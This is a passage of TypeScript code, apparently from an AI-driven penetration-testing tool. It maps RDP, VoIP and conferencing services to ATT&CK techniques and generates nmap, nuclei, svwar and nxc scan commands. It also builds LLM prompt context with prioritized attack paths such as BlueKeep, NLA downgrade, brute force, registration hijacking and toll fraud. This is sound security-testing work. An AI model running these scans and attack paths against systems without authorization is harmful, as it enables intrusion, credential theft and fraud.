    { pattern: /OpenSIPS/i, vendor: 'OpenSIPS', product: 'OpenSIPS' },
    { pattern: /Polycom/i, vendor: 'Polycom', product: 'VoIP Phone' },
    { pattern: /Yealink/i, vendor: 'Yealink', product: 'VoIP Phone' },
    { pattern: /Grandstream/i, vendor: 'Grandstream', product: 'VoIP Phone' },
    { pattern: /Mitel/i, vendor: 'Mitel', product: 'MiVoice' },
    { pattern: /RingCentral/i, vendor: 'RingCentral', product: 'RingCentral' },
    { pattern: /Twilio/i, vendor: 'Twilio', product: 'Twilio SIP' },
  ];

  for (const { pattern, vendor, product } of vendorPatterns) {
    const match = pattern.exec(identifier);
    if (match) {
      return { vendor, product, version: match[1], userAgent, server };
    }
  }

  return { vendor: 'Unknown', product: identifier || 'Unknown SIP', userAgent, server };
}

// ═══════════════════════════════════════════════════════════════════════
// §6 — ATT&CK TECHNIQUE MAPPING FOR RDP/VoIP/CONFERENCING
// ═══════════════════════════════════════════════════════════════════════

export interface AttackTechniqueMapping {
  techniqueId: string;
  techniqueName: string;
  tactic: string;
  services: string[];
  description: string;
}

export const RDP_VOIP_ATTACK_TECHNIQUES: AttackTechniqueMapping[] = [
  // RDP
  { techniqueId: 'T1021.001', techniqueName: 'Remote Services: Remote Desktop Protocol', tactic: 'lateral-movement', services: ['rdp'], description: 'Use RDP for lateral movement with valid credentials' },
  { techniqueId: 'T1210', techniqueName: 'Exploitation of Remote Services', tactic: 'lateral-movement', services: ['rdp', 'sip', 'h323'], description: 'Exploit RDP/VoIP service vulnerabilities for lateral movement' },
  { techniqueId: 'T1563.002', techniqueName: 'Remote Service Session Hijacking: RDP Hijacking', tactic: 'lateral-movement', services: ['rdp'], description: 'Hijack disconnected RDP sessions using tscon' },
  { techniqueId: 'T1110.001', techniqueName: 'Brute Force: Password Guessing', tactic: 'credential-access', services: ['rdp', 'sip'], description: 'Brute force RDP or SIP credentials' },
  { techniqueId: 'T1110.003', techniqueName: 'Brute Force: Password Spraying', tactic: 'credential-access', services: ['rdp', 'sip'], description: 'Spray passwords across RDP or SIP accounts' },
  { techniqueId: 'T1557', techniqueName: 'Adversary-in-the-Middle', tactic: 'credential-access', services: ['rdp', 'sip', 'rtp'], description: 'MITM attacks on RDP (NLA downgrade) or SIP/RTP (eavesdropping)' },

  // VoIP/SIP
  { techniqueId: 'T1040', techniqueName: 'Network Sniffing', tactic: 'credential-access', services: ['sip', 'rtp'], description: 'Capture SIP credentials or RTP audio streams' },
  { techniqueId: 'T1589.001', techniqueName: 'Gather Victim Identity: Credentials', tactic: 'reconnaissance', services: ['sip'], description: 'Enumerate SIP extensions and gather VoIP credentials' },
  { techniqueId: 'T1046', techniqueName: 'Network Service Discovery', tactic: 'discovery', services: ['sip', 'h323', 'mgcp', 'sccp'], description: 'Discover VoIP/conferencing services on the network' },
  { techniqueId: 'T1496', techniqueName: 'Resource Hijacking', tactic: 'impact', services: ['sip'], description: 'Toll fraud via unauthorized SIP call initiation' },
  { techniqueId: 'T1556', techniqueName: 'Modify Authentication Process', tactic: 'credential-access', services: ['sip'], description: 'SIP registration hijacking to redirect calls' },
  { techniqueId: 'T1600', techniqueName: 'Weaken Encryption', tactic: 'defense-evasion', services: ['sip', 'rtp'], description: 'SRTP to RTP downgrade attack' },

  // Conferencing
  { techniqueId: 'T1078.001', techniqueName: 'Valid Accounts: Default Accounts', tactic: 'initial-access', services: ['conferencing', 'rdp'], description: 'Default credentials on conferencing equipment (Polycom, Cisco, Crestron)' },
  { techniqueId: 'T1133', techniqueName: 'External Remote Services', tactic: 'initial-access', services: ['conferencing', 'rdp'], description: 'Access conferencing equipment web interfaces or management ports' },
  { techniqueId: 'T1059', techniqueName: 'Command and Scripting Interpreter', tactic: 'execution', services: ['conferencing'], description: 'Execute commands on Crestron/Cisco devices via CTP/SSH' },
  { techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application', tactic: 'initial-access', services: ['conferencing', 'sip'], description: 'Exploit web interfaces of conferencing equipment' },
];

// ═══════════════════════════════════════════════════════════════════════
// §7 — SCAN COMMAND GENERATORS
// ═══════════════════════════════════════════════════════════════════════

export interface ScanCommand {
  tool: string;
  command: string;
  purpose: string;
  timeout: number;
}

/**
 * Generate scan commands for RDP service
 */
export function generateRdpScanCommands(target: string, port: number = 3389): ScanCommand[] {
  return [
    { tool: 'nmap', command: `nmap -p ${port} --script rdp-vuln-ms12-020,rdp-ntlm-info,rdp-enum-encryption -sV ${target}`, purpose: 'RDP vulnerability scan (BlueKeep, NLA, encryption)', timeout: 60 },
    { tool: 'rdp-sec-check', command: `rdp-sec-check ${target}:${port}`, purpose: 'RDP security configuration audit', timeout: 30 },
    { tool: 'nuclei', command: `nuclei -u rdp://${target}:${port} -tags rdp,cve,network -severity critical,high`, purpose: 'RDP CVE scanning via Nuclei', timeout: 120 },
    { tool: 'nxc', command: `nxc rdp ${target} -u '' -p '' --port ${port}`, purpose: 'RDP null authentication test', timeout: 15 },
  ];
}

/**
 * Generate scan commands for SIP/VoIP service
 */
export function generateSipScanCommands(target: string, port: number = 5060): ScanCommand[] {
  return [
    { tool: 'nmap', command: `nmap -sU -p ${port} --script sip-enum-users,sip-methods ${target}`, purpose: 'SIP method and user enumeration', timeout: 60 },
    { tool: 'svmap', command: `svmap ${target}`, purpose: 'SIP device discovery and fingerprinting', timeout: 30 },
    { tool: 'svwar', command: `svwar -e100-200 -m OPTIONS ${target} -p ${port}`, purpose: 'SIP extension enumeration (first 100)', timeout: 60 },
    { tool: 'sippts_scan', command: `sippts_scan -i ${target} -r ${port}`, purpose: 'SIP service fingerprinting', timeout: 30 },
  ];
}

/**
 * Generate scan commands for conferencing equipment
 */
export function generateConferencingScanCommands(target: string): ScanCommand[] {
  return [
    { tool: 'nmap', command: `nmap -p 22,80,443,8443,9090,41795,5060 -sV --script http-title,http-server-header ${target}`, purpose: 'Conferencing equipment port and service discovery', timeout: 60 },
    { tool: 'nuclei', command: `nuclei -u https://${target} -tags cisco,polycom,crestron,zoom,iot,default-login -severity critical,high,medium`, purpose: 'Conferencing equipment CVE and default credential scanning', timeout: 120 },
    { tool: 'curl', command: `curl -sk -o /dev/null -w "%{http_code}" https://${target}/api/v1/mgmt/device/info`, purpose: 'Polycom API endpoint check', timeout: 10 },
    { tool: 'curl', command: `curl -sk -o /dev/null -w "%{http_code}" https://${target}/api/v1/status`, purpose: 'Cisco TelePresence API endpoint check', timeout: 10 },
  ];
}

// ═══════════════════════════════════════════════════════════════════════
// §8 — INTEGRATION HELPERS
// ═══════════════════════════════════════════════════════════════════════

/**
 * Get all exploit knowledge for a given service type
 */
export function getExploitKnowledgeForService(service: string): ExploitKnowledge[] {
  const svc = service.toLowerCase();
  if (svc === 'rdp' || svc === 'ms-wbt-server' || svc === 'remote desktop') return RDP_EXPLOITS;
  if (svc === 'sip' || svc === 'sips' || svc === 'voip') return VOIP_SIP_EXPLOITS;
  if (svc === 'conferencing' || svc === 'h323' || svc === 'sccp' || svc === 'mgcp') return CONFERENCING_EXPLOITS;
  return [];
}

/**
 * Get LLM prompt context for a specific service and vulnerability
 */
export function getLlmPromptContextForService(service: string, cve?: string): string {
  const exploits = getExploitKnowledgeForService(service);
  if (cve) {
    const specific = exploits.find(e => e.cves?.includes(cve));
    if (specific) return specific.llmPromptContext;
  }
  // Return all relevant context for the service
  return exploits.map(e => `## ${e.title}\n${e.llmPromptContext}`).join('\n\n');
}

/**
 * Get ATT&CK techniques relevant to a service
 */
export function getAttackTechniquesForService(service: string): AttackTechniqueMapping[] {
  const svc = service.toLowerCase();
  return RDP_VOIP_ATTACK_TECHNIQUES.filter(t => t.services.includes(svc));
}

/**
 * Get scan commands for a detected service
 */
export function getScanCommandsForService(service: string, target: string, port: number): ScanCommand[] {
  const svc = service.toLowerCase();
  if (svc === 'rdp' || svc === 'ms-wbt-server') return generateRdpScanCommands(target, port);
  if (svc === 'sip' || svc === 'sips' || svc === 'voip') return generateSipScanCommands(target, port);
  if (svc === 'conferencing' || svc === 'h323' || svc === 'sccp') return generateConferencingScanCommands(target);
  return [];
}

/**
 * Check if a port belongs to RDP/VoIP/conferencing services
 */
export function isRdpVoipConferencingPort(port: number): boolean {
  return RDP_VOIP_PORTS.some(p => p.port === port);
}

/**
 * Get the service name for a known RDP/VoIP/conferencing port
 */
export function getServiceForPort(port: number): string | null {
  const profile = RDP_VOIP_PORTS.find(p => p.port === port);
  return profile?.service || null;
}

/**
 * Build comprehensive LLM context for exploitation of RDP/VoIP/conferencing targets
 */
export function buildExploitContextForLlm(params: {
  service: string;
  target: string;
  port: number;
  cve?: string;
  hasNla?: boolean;
  sipExtensions?: string[];
  conferencingVendor?: string;
}): string {
  const { service, target, port, cve, hasNla, sipExtensions, conferencingVendor } = params;
  const exploits = getExploitKnowledgeForService(service);
  const techniques = getAttackTechniquesForService(service);

  let context = `\n## ${service.toUpperCase()} Exploitation Context for ${target}:${port}\n\n`;

  // Service-specific context
  if (service === 'rdp') {
    context += `### RDP Security Assessment\n`;
    context += `NLA Status: ${hasNla === undefined ? 'Unknown' : hasNla ? 'Enabled (limits pre-auth attacks)' : 'Disabled (BlueKeep/MITM possible)'}\n`;
    context += `\nPrioritized attack path:\n`;
    if (!hasNla) {
      context += `1. Check for BlueKeep (CVE-2019-0708) — pre-auth RCE\n`;
      context += `2. Attempt NLA downgrade for credential capture\n`;
      context += `3. Credential brute force / password spray\n`;
    } else {
      context += `1. Credential brute force / password spray (NLA enabled)\n`;
      context += `2. Check for DejaBlue (CVE-2019-1181/1182) — post-auth RCE\n`;
      context += `3. If credentials obtained: session hijacking via tscon\n`;
    }
  } else if (service === 'sip' || service === 'voip') {
    context += `### VoIP/SIP Security Assessment\n`;
    if (sipExtensions?.length) {
      context += `Known extensions: ${sipExtensions.join(', ')}\n`;
    }
    context += `\nPrioritized attack path:\n`;
    context += `1. SIP extension enumeration (REGISTER/OPTIONS)\n`;
    context += `2. SIP digest authentication cracking\n`;
    context += `3. Check for SRTP vs RTP (eavesdropping risk)\n`;
    context += `4. Registration hijacking (if credentials obtained)\n`;
    context += `5. Toll fraud proof-of-concept (internal numbers only)\n`;
  } else if (service === 'conferencing') {
    context += `### Conferencing Equipment Assessment\n`;
    if (conferencingVendor) context += `Vendor: ${conferencingVendor}\n`;
    context += `\nPrioritized attack path:\n`;
    context += `1. Default credential testing (vendor-specific)\n`;
    context += `2. API endpoint enumeration\n`;
    context += `3. Configuration extraction\n`;
    context += `4. CVE scanning (vendor-specific)\n`;
  }

  // Add relevant exploit knowledge
  if (cve) {
    const specific = exploits.find(e => e.cves?.includes(cve));
    if (specific) {
      context += `\n### Specific CVE Context: ${cve}\n${specific.llmPromptContext}\n`;
    }
  }

  // Add ATT&CK context
  if (techniques.length > 0) {
    context += `\n### MITRE ATT&CK Techniques\n`;
    for (const t of techniques) {
      context += `- ${t.techniqueId}: ${t.techniqueName} (${t.tactic})\n`;
    }
  }

  return context;
}
